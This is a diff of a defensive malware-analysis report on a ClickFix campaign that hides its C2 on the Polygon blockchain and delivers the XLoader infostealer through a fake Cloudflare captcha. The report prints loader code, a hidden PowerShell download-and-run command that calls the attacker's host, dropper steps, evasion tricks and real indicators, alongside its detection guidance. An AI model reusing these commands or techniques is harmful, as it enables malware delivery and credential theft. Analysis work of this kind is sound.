@@ -25,7 +25,7 @@ The loader was captured from the homepage of **`www.cocobproductions.com`**, a W
 
 ## 2. Executive summary
 
-This is a **ClickFix** campaign: the end goal is to trick the victim into running a native command on their own machine, defeating every browser and download-based control by making the human the delivery mechanism. The browser-side C2 address is concealed with **EtherHiding** — it is read from a smart contract on **Polygon mainnet**, so there is no fixed JavaScript C2 hostname in the page and the lookup is indistinguishable from ordinary public-RPC traffic.
+This is a **ClickFix** campaign: the end goal is to trick the victim into running a native command on their own machine, defeating every browser and download-based control by making the human the delivery mechanism. The browser-side C2 address is concealed with **EtherHiding**: it is read from a smart contract on **Polygon mainnet**, so there is no fixed JavaScript C2 hostname in the page and the lookup is indistinguishable from ordinary public-RPC traffic.
 
 The chain has six stages:
 
@@ -40,7 +40,7 @@ reaper recovered every JavaScript stage statically; the PowerShell layers are si
 
 ### 2.1 On-chain C2, and why it is the strongest IOC
 
-The C2 hostname lives in contract storage, not in the page. Two independent Polygon RPC providers returned identical bytes decoding to `https://enter-code-cdn.info` (`artifacts/stage2-contract/`). The operator can rotate the C2 for every compromised site at once by sending a single transaction to the contract — without editing any victim page. That makes the **contract address `0xB6bC9e1D…C1f2` + selector `0xb68d1809`** the most durable indicator: the RPC endpoints, the XOR scheme, and the C2 hostname are all replaceable, but the contract is fixed until the operator redeploys.
+The C2 hostname lives in contract storage, not in the page. Two independent Polygon RPC providers returned identical bytes decoding to `https://enter-code-cdn.info` (`artifacts/stage2-contract/`). The operator can rotate the C2 for every compromised site at once by sending a single transaction to the contract, without editing any victim page. That makes the **contract address `0xB6bC9e1D…C1f2` + selector `0xb68d1809`** the most durable indicator: the RPC endpoints, the XOR scheme, and the C2 hostname are all replaceable, but the contract is fixed until the operator redeploys.
 
 ## 3. Attack chain, stage by stage
 
@@ -56,7 +56,7 @@ The compromised page carries one inline script of the form:
   (new Function(new TextDecoder().decode(_0x64de)))();}();
 ```
 
-The obfuscation is deliberately un-fancy: base64 in the source (so a scanner sees only an opaque string), one XOR byte (`_0xd730 = 12`) to defeat plain `grep`, and `new Function` instead of `eval`. reaper's default scan flags exactly this shape — `atob`, a 2 712-char high-entropy string literal, and the `new Function` sink — without decoding anything.
+The obfuscation is deliberately un-fancy: base64 in the source (so a scanner sees only an opaque string), one XOR byte (`_0xd730 = 12`) to defeat plain `grep`, and `new Function` instead of `eval`. reaper's default scan flags exactly this shape (`atob`, a 2 712-char high-entropy string literal, and the `new Function` sink) without decoding anything.
 
 ### 3.2 Stage 1 (continued) — what the loader does
 
@@ -98,7 +98,7 @@ XOR-12 decoding yields ~30 lines (`artifacts/stage1-loader/loader.deobf.js`). Re
 })();
 ```
 
-The `abiDecodeString` routine is a hand-rolled Solidity ABI decoder for a single `string` return: 32 bytes offset (`0x20`), 32 bytes length, then the UTF-8 bytes. The eight RPC endpoints are load-balancing/resilience — any public Polygon RPC serves the read. The `_v` parameter is a per-minute cache-buster. `marker` (`d337fe…be1ae`) is the campaign/victim tag echoed to `/api.php`.
+The `abiDecodeString` routine is a hand-rolled Solidity ABI decoder for a single `string` return: 32 bytes offset (`0x20`), 32 bytes length, then the UTF-8 bytes. The eight RPC endpoints are load-balancing/resilience: any public Polygon RPC serves the read. The `_v` parameter is a per-minute cache-buster. `marker` (`d337fe…be1ae`) is the campaign/victim tag echoed to `/api.php`.
 
 ### 3.3 Stage 2 — the on-chain read
 
@@ -118,7 +118,7 @@ The host resolves to `178.16.52.101` (AS202412, Omegatech LTD), nginx. This is t
 - **Encrypted victim beacon.** It SHA-256s the campaign key `K`, imports it as an **AES-GCM** key, and encrypts `{url, referrer, vid}` (a random UUID) before POSTing it to `/api.php?k=…&d=…` (with a plaintext `fetch` fallback). This gives the operator per-victim telemetry that is opaque on the wire.
 - **Fake Cloudflare overlay.** A full-screen `verify-window` styled to imitate Cloudflare's "verify you are human" interstitial, complete with a spoofed **`Ray ID:`**. The instruction text is localised into **11 languages** (English, French, Spanish, Italian, Portuguese, German, Turkish, Arabic, Japanese, Chinese, Korean), each walking the victim through pressing the **Windows key** ("located at the bottom of your keyboard between Ctrl and Alt") → `R` → paste → Enter.
 - **Clipboard write.** On the fake "verify" gesture it calls `navigator.clipboard.writeText` (with a legacy `execCommand('copy')` fallback via a hidden `<textarea>`) with the assembled PowerShell command.
-- **Header flags.** `OS="windows"`, `HF=true`, `T=false` — this build is Windows-only; non-Windows visitors are not served the lure.
+- **Header flags.** `OS="windows"`, `HF=true`, `T=false`: this build is Windows-only; non-Windows visitors are not served the lure.
 
 ### 3.5 Stage 3 (continued) — the clipboard command
 
@@ -128,9 +128,9 @@ powershell -w h "iex(irm 'enter-code-cdn.info/<16hex>' -UseBasicParsing)"; exit 
 
 Assembled in the overlay as `cmdUrl + '; exit ' + '<#' + ray + '#>'`. Breakdown:
 
-- `-w h` = `-WindowStyle Hidden` — no visible console.
-- `iex(irm '…' -UseBasicParsing)` = `Invoke-Expression(Invoke-RestMethod …)` — download-and-run in memory, nothing written to disk.
-- `; exit <#<ray>#>` — the `<# … #>` is a PowerShell **block comment** holding the same spoofed Cloudflare "Ray ID" shown in the overlay. Its only purpose is to make the pasted string look like it carries a legitimate verification code, reinforcing the captcha story.
+- `-w h` = `-WindowStyle Hidden`, no visible console.
+- `iex(irm '…' -UseBasicParsing)` = `Invoke-Expression(Invoke-RestMethod …)`: download-and-run in memory, nothing written to disk.
+- `; exit <#<ray>#>`: the `<# … #>` is a PowerShell **block comment** holding the same spoofed Cloudflare "Ray ID" shown in the overlay. Its only purpose is to make the pasted string look like it carries a legitimate verification code, reinforcing the captcha story.
 - The **16-hex path is minted fresh per visit.** The path first observed in the wild (`ef41f64bdf47f6c7`) had already rotated to `404` by analysis time; the live overlay handed out `2e4c20ee0bea3120`. The `/<hash>` route is distinguishable from the server's `403` baseline (unknown paths `403`, the real hash route and `<hash>.php` return content/`404`), i.e. it is a real per-victim endpoint, likely one-time or short-TTL.
 
 ### 3.6 Stage 4 — PowerShell downloader
@@ -148,7 +148,7 @@ It fetches the same path with `?_=1` over WinHTTP (a different client than `irm`
 
 ### 3.7 Stage 5 — PowerShell dropper
 
-`/<hash>?_=1` returns a larger blob prefixed with `<#<hash>#>`: a byte array XOR-`77`, whose bytes join into base64, which decodes to another script that base64-decodes once more and XORs with `76` before `iex` — three mechanical layers. The fully unwrapped result is the dropper (`artifacts/stage4-powershell/3.dropper.deobf.ps1`):
+`/<hash>?_=1` returns a larger blob prefixed with `<#<hash>#>`: a byte array XOR-`77`, whose bytes join into base64, which decodes to another script that base64-decodes once more and XORs with `76` before `iex`: three mechanical layers. The fully unwrapped result is the dropper (`artifacts/stage4-powershell/3.dropper.deobf.ps1`):
 
 ```powershell
 Start-Sleep -Seconds 20                                  # sandbox-timeout evasion
@@ -172,8 +172,8 @@ Decoded URLs and the archive password are in `artifacts/stage4-powershell/droppe
 The archive (`/<64hex>`, pw `password1234`) contains a single file, `xloader.exe`. Facts (full record in `artifacts/stage5-payload/README-native-payload.txt`; the binary is **not** committed):
 
 - **PE32+ / x86-64 / GUI**, 7 sections, `SizeOfImage` 278 528, compiled **2026-07-10** (one day before the archive was packed).
-- **819 450 880 bytes on disk, but only ~250 KB is real** — the remaining 781 MB (100.0 % of the tail) is `0x00` padding. The `.7z` is 230 KB on the wire and inflates ~3 500× on extraction.
-- Minimal imports (`KERNEL32`, `USER32`, `GDI32`, `ole32`, `OLEAUT32`) plus `IsDebuggerPresent`, `VirtualProtect`, `LoadLibraryExW`, `GetProcAddress`, `CreateThread` — a packed stub that unpacks in memory and checks for a debugger. Consistent with **XLoader / Formbook**, whose C2 configuration is encrypted inside the stub and not recoverable statically.
+- **819 450 880 bytes on disk, but only ~250 KB is real**: the remaining 781 MB (100.0 % of the tail) is `0x00` padding. The `.7z` is 230 KB on the wire and inflates ~3 500× on extraction.
+- Minimal imports (`KERNEL32`, `USER32`, `GDI32`, `ole32`, `OLEAUT32`) plus `IsDebuggerPresent`, `VirtualProtect`, `LoadLibraryExW`, `GetProcAddress`, `CreateThread`: a packed stub that unpacks in memory and checks for a debugger. Consistent with **XLoader / Formbook**, whose C2 configuration is encrypted inside the stub and not recoverable statically.
 
 The file bloat is the headline evasion: many AV/EDR and sandbox pipelines skip files above a size cap (commonly 100–500 MB), so the extracted binary is never scanned or auto-submitted, while its tiny compressed form moves quickly and cheaply.
 
@@ -208,24 +208,24 @@ The file bloat is the headline evasion: many AV/EDR and sandbox pipelines skip f
 
 ## 5. Methodology — reaper features exercised
 
-1. **HTML ingestion** — `reaper sample.html` pulls the inline `<script>` into a virtual sub-file and analyses the decoded JS.
-2. **Default scan** — surfaces the `atob`, high-entropy string, and `new Function` sink on the still-encoded loader with no decoding.
-3. **`--triage` / `--iocs --defang`** — on the decoded loader, extracts the Polygon contract address + 8 RPC endpoints and returns a `SUSPICIOUS` verdict; on the decoded overlay, extracts `enter-code-cdn.info`, `/api.php`, and the spoofed `cloudflare.com`.
-4. **`examples/etherhiding/fetch-evm-payload.mjs`** — reused for the single on-chain read, driven onto Polygon with `--rpc https://polygon.drpc.org --selector 0xb68d1809`. This is the first non-BSC use of that helper and argues for promoting it from `examples/etherhiding/` to `scripts/` now that a second blockchain-staged sample exists.
-5. **Manual XOR/base64 unwrapping** — the loader (XOR 12), overlay (XOR 177), and the three PowerShell layers (XOR 42 / 77+base64 / base64+XOR 76) are decoded with the one-liners in `README.md`; each browser layer's committed `*.deobf.*` is byte-for-byte reproducible.
+1. **HTML ingestion.** `reaper sample.html` pulls the inline `<script>` into a virtual sub-file and analyses the decoded JS.
+2. **Default scan.** Surfaces the `atob`, high-entropy string, and `new Function` sink on the still-encoded loader with no decoding.
+3. **`--triage` / `--iocs --defang`.** On the decoded loader, extracts the Polygon contract address + 8 RPC endpoints and returns a `SUSPICIOUS` verdict; on the decoded overlay, extracts `enter-code-cdn.info`, `/api.php`, and the spoofed `cloudflare.com`.
+4. **`examples/etherhiding/fetch-evm-payload.mjs`.** Reused for the single on-chain read, driven onto Polygon with `--rpc https://polygon.drpc.org --selector 0xb68d1809`. This is the first non-BSC use of that helper and argues for promoting it from `examples/etherhiding/` to `scripts/` now that a second blockchain-staged sample exists.
+5. **Manual XOR/base64 unwrapping.** The loader (XOR 12), overlay (XOR 177), and the three PowerShell layers (XOR 42 / 77+base64 / base64+XOR 76) are decoded with the one-liners in `README.md`; each browser layer's committed `*.deobf.*` is byte-for-byte reproducible.
 
 ## 6. Mitigations and detections
 
 - **Content Security Policy (highest leverage).** A strict `script-src` that forbids inline `<script>` and unknown hosts stops the injected loader and the dynamically-injected `/api.php` tag. This single control breaks the browser chain.
-- **Network egress — the on-chain read.** Where no Web3 activity is expected, alert on browser-origin `eth_call` POSTs to public Polygon RPCs, and specifically on any request whose `params[0].to` equals `0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2` or `params[0].data` begins `0xb68d1809`. Block `enter-code-cdn.info` / `178.16.52.101` outright.
+- **Network egress (the on-chain read).** Where no Web3 activity is expected, alert on browser-origin `eth_call` POSTs to public Polygon RPCs, and specifically on any request whose `params[0].to` equals `0xB6bC9e1D0b2fB96Ab7C47E04Cb0BE477410bC1f2` or `params[0].data` begins `0xb68d1809`. Block `enter-code-cdn.info` / `178.16.52.101` outright.
 - **The ClickFix technique itself.** The durable behavioural detection is not any one domain but the pattern: **`powershell` / `iex` / `irm` reaching the clipboard from a browser**, then a `powershell.exe` child of `explorer.exe` with `-w`/`-WindowStyle Hidden` and `iex(irm …)` on the command line. Alert on both. The `exit <# … #>` block-comment tail is a high-fidelity ClickFix signature.
-- **Endpoint — the PowerShell chain.** Alert on `New-Object -ComObject WinHttp.WinHttpRequest`, `[scriptblock]::Create` fed from a downloaded body, and `-bxor` byte-array joins in PowerShell. Flag `Start-Process` of an executable extracted from a password-protected archive in `%TEMP%`.
-- **Endpoint — the payload.** Treat multi-hundred-MB PEs unpacked from tiny archives as suspicious by default; do not let a size cap silently exclude them from scanning. Extraction of any file named `xloader.exe`, and `7za.exe` running against a `password1234`-protected archive, are direct hits.
+- **Endpoint (the PowerShell chain).** Alert on `New-Object -ComObject WinHttp.WinHttpRequest`, `[scriptblock]::Create` fed from a downloaded body, and `-bxor` byte-array joins in PowerShell. Flag `Start-Process` of an executable extracted from a password-protected archive in `%TEMP%`.
+- **Endpoint (the payload).** Treat multi-hundred-MB PEs unpacked from tiny archives as suspicious by default; do not let a size cap silently exclude them from scanning. Extraction of any file named `xloader.exe`, and `7za.exe` running against a `password1234`-protected archive, are direct hits.
 - **Origin server.** Integrity-check the compromised WordPress core, plugins, themes, and database; grep `wp_posts` / `wp_options` and active theme templates for inline `<script>` containing `atob(` + `new Function`.
 
 ## 7. Limitations
 
-- The **XLoader C2 configuration** is encrypted inside the packed stub and was not recovered; family attribution rests on the filename, packing, imports, and delivery pattern rather than an unpacked config. The binary itself is not committed (819 MB bloat + live infostealer) — only its hashes and PE metadata are recorded.
+- The **XLoader C2 configuration** is encrypted inside the packed stub and was not recovered; family attribution rests on the filename, packing, imports, and delivery pattern rather than an unpacked config. The binary itself is not committed (819 MB bloat + live infostealer); only its hashes and PE metadata are recorded.
 - The `artifacts/` tree is a snapshot from **2026-07-28**. Both the on-chain C2 string and the per-visit 16-hex/64-hex paths rotate; re-fetches will differ, and the first-observed lure hash (`ef41f64bdf47f6c7`) was already dead at analysis time.
 - Only selector `0xb68d1809` was probed on the contract; other selectors may serve decoys, kill switches, or per-region C2 strings. The contract's deployer address and transaction history (payload rotations) were not enumerated and are good follow-up pivots.
 - The compromise vector on `cocobproductions.com` is out of scope.
